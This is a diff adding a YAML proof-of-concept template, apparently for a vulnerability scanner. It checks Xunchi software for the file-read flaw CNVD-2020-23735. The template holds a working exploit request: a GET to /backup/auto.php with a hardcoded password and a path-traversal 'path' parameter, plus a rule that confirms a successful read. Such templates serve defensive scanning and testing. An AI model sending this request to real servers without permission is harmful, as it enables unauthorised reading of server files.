@@ -1,0 +1,24 @@
+id: poc-yaml-xunchi-cnvd-2020-23735-file-read
+info:
+  name: Xunchi File Read (CNVD-2020-23735)
+  severity: medium
+  tags:
+  - cnvd-2020-23735
+  - CNVD-2020-23735
+  finger: Xunchi
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+  headers:
+    Accept-Encoding: deflate
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "NzbwpQSdbY06Dngnoteo2wdgiekm7j4N")
+    && contains(body, "display_errors")
+  output: []
